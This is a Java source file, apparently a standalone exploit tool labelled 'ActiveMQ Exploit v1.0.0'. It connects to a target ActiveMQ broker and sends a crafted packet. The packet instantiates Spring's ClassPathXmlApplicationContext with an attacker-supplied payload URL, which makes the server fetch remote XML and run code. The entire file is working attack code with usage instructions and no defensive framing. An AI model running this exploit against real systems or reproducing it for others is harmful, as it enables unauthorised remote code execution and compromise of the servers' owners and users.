import java.io.*;
import java.net.Socket;
public class Main {
    public static void main(String[] args) {
        try{
            System.out.println("[+] ActiveMQ Exploit v1.0.0 By:0vercl0k");
        if (args.length < 2) {

            System.err.println("Usage: java exploit.jar <TargetIp> <TargetPort> <Payload_URL>");
            System.exit(1);
        }
        String ip = args[0];
        int port = Integer.parseInt(args[1]);
        Socket sck = new Socket(ip, port);
        System.out.println("[+] Connect to TargetIp:"+ip);
        DataOutputStream out = null;
        DataInputStream in = null;
        out = new DataOutputStream(new BufferedOutputStream(new FileOutputStream("process.dat")));
        out.writeInt(32);
        out.writeByte(31);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeBoolean(true);

        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        out.writeBoolean(true);
        out.writeUTF(args[2]);
        out.close();
        System.out.println("[*] Start exploiting the vulnerability");
        in = new DataInputStream(new BufferedInputStream(new FileInputStream("process.dat")));


        OutputStream os = sck.getOutputStream();
        int length = in.available();
        byte[] buf = new byte[length];
        in.readFully(buf);
        System.out.println("[+] Trigger Vulnerability");
        os.write(buf);
        in.close();
        sck.close();
            try {
                File delfile = new File("process.dat");
                delfile.delete();

            }catch (Exception error){
                error.printStackTrace();
            }
        System.out.println("[+] Vulnerability exploit completed");
        }catch (Exception error){
            error.printStackTrace();
            System.out.println("未知错误");
            System.exit(0);
        }
    }
}